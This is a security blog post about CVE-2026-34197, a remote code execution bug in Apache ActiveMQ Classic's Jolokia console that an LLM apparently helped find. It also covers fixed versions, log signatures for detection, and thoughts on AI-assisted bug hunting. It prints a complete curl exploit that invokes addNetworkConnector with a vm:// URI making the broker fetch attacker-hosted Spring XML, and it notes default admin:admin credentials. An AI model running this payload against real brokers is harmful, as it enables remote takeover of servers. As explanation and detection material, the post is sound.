+++
title = "The ActiveMQ Bug That Hid in Plain Sight for 13 Years — Until Claude Read the Config"
date = "2026-04-07"
+++

CVE-2026-34197 dropped in April, and its nickname says most of what you need to know: "10 Minutes with Claude." It's a 13-year-old remote code execution bug in Apache ActiveMQ Classic. The person who found it didn't find it in the traditional sense — an LLM did, on a first pass through the source. The human's job was validating the finding, chaining it into a working exploit, and writing it up. By most estimates, the discovery itself was 80% Claude.

## A patch that left the door unlocked

ActiveMQ Classic ships with a web console on port 8161, built on Jolokia — an HTTP-to-JMX bridge that turns broker management into a REST API. Back in 2022, ThreatBook demonstrated that an authenticated attacker could abuse Jolokia to invoke JDK MBeans like `FlightRecorder` and drop webshells (CVE-2022-41678). The fix that followed locked Jolokia down to read-only access and blocked a list of dangerous MBeans — but it also carved out a blanket exception so the console itself wouldn't break:

```xml
<allow>
  <mbean>
    <name>org.apache.activemq:*</name>
    <attribute>*</attribute>
    <operation>*</operation>
  </mbean>
</allow>
```

That one exception is the entire story here. It made every operation on every ActiveMQ-owned MBean reachable through Jolokia, no questions asked. Nobody seems to have asked the obvious follow-up question at the time: could any of those operations actually get you code execution? Turns out one of them could — `addNetworkConnector`.

## Following the chain

ActiveMQ brokers can network together to distribute load, and `addNetworkConnector(String)` is what wires those connections up at runtime. It takes a discovery URI as input. Separately, ActiveMQ supports `vm://`, an in-process transport meant for embedding a broker directly inside an application. Point `vm://` at a broker that doesn't exist yet, and ActiveMQ will happily spin one up — using a `brokerConfig` parameter that tells it where to pull configuration from, including a remote URL.

Put those two features next to each other and the exploit writes itself:

```bash
curl -s -X POST http://TARGET:8161/api/jolokia/ \
  -H "Content-Type: application/json" \
  -H "Origin: http://TARGET:8161" \
  -u admin:admin \
  -d '{
    "type": "exec",
    "mbean": "org.apache.activemq:type=Broker,brokerName=localhost",
    "operation": "addNetworkConnector",
    "arguments": ["static:(vm://rce?brokerConfig=xbean:http://ATTACKER:8888/payload.xml)"]
  }'
```

The `vm://` transport notices the target broker doesn't exist, calls `BrokerFactory.createBroker()` against the attacker's URL, and the `xbean:` scheme tells ActiveMQ to parse the response as Spring XML. Spring's `ResourceXmlApplicationContext` then dutifully instantiates every bean defined in that file — including, if the attacker wants, a `MethodInvokingFactoryBean` wired up to call `Runtime.getRuntime().exec()`. It's the same sink that made CVE-2023-46604 a fixture on CISA's KEV list.

## Why this is worse than it sounds

Technically the exploit needs valid credentials, but `admin:admin` remains the default on a lot of ActiveMQ installs, so that's a low bar. It gets worse on ActiveMQ 6.0.0 through 6.1.1: CVE-2024-32114 accidentally stripped `/api/*` out of the web console's security constraints entirely, leaving Jolokia wide open with no authentication at all. On those versions, CVE-2026-34197 needs nothing but network access. The fix — shipped in 5.19.6 and 6.2.5 — simply removes the ability for `addNetworkConnector` to point at `vm://` transports, since that was never supposed to be something you could trigger remotely in the first place.

## What to actually watch for

The most useful part of Horizon3's writeup, for my money, is the log signature:

```text
INFO | Establishing network connection from vm://localhost to vm://rce?create=true&brokerConfig=xbean:http://X.X.X.X:8888/payload.xml
WARN | Could not connect to remote URI: ... The configuration has no BrokerService instance
```

That WARN line only shows up after the payload has already executed, but ActiveMQ retries the connection several times, so there's still a detection window to work with. Beyond the log lines themselves, keep an eye out for POST requests to `/api/jolokia/` containing `addNetworkConnector`, outbound HTTP calls from the broker process to hosts it has no business talking to, and any child processes spawned unexpectedly off the Java process.

## The part I can't stop thinking about

What sticks with me isn't the exploit chain — it's the discovery method. The setup was almost casually simple: give Claude a light prompt, point it at a target on the network, let it validate what it finds. Most of what comes out of that process doesn't amount to much. This time it did, off the back of a couple of basic prompts.

I went into this skeptical of AI-assisted vulnerability hunting, mostly because every demo I'd seen was cherry-picked to look impressive. This one felt different in kind, not just degree. The model wasn't fuzzing inputs or matching against a known bug class — it read an XML allowlist, noticed the blanket `*` sitting on `<operation>`, and asked what an attacker could actually do with `addNetworkConnector` once the door was open. That's reasoning about a security boundary, not pattern-matching against training data. A human still had to validate it, build the working chain, and write it up — but the question that mattered got asked by the model.

And that's the uncomfortable part. This hole sat there for 13 years, through a patch cycle that was reviewed, approved, and shipped by people who presumably know ActiveMQ well. It took an LLM reading the config with fresh eyes to notice what the blanket allow actually permitted. I genuinely don't know whether that says more about how good these models are getting, or about how porous our review processes have been all along. Probably a bit of both.
